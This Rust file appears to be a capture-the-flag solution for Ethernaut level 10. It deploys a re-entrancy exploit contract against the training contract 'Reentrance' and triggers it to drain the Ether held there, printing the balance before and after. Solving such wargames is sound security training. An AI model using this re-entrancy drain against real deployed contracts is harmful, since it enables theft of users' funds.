//! Ethernaut 10 — Re-entrancy.
//!
//! Goal: Empty the Ether held by `Reentrance`, a contract that records
//! donations and lets users withdraw their balances.
//!
//! https://github.com/OpenZeppelin/ethernaut/blob/d05643a/contracts/src/levels/Reentrance.sol

use alloy::primitives::U256;
use alloy::providers::Provider;
use async_trait::async_trait;
use ctf::Actor;
use ctf::ethereum::ethernaut::lvl10_reentrancy::*;

pub struct Exploit;

alloy::sol!(
    #[sol(rpc)]
    ReentranceExploit,
    "out/ReentranceExploit.sol/ReentranceExploit.json"
);

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    async fn attack(
        self,
        target: &Self::Target,
        offender: &Actor,
    ) -> eyre::Result<()> {
        let provider = offender.provider();
        let balance_before = provider.get_balance(target.address).await?;

        println!("Balance before: {balance_before:?}");

        let exploit =
            ReentranceExploit::deploy(offender.provider(), target.address)
                .await?;

        exploit
            .attack()
            .value(balance_before / U256::from(2))
            .send()
            .await?
            .watch()
            .await?;

        let balance_after = provider.get_balance(target.address).await?;

        println!("Balance after: {balance_after:?}");

        Ok(())
    }
}
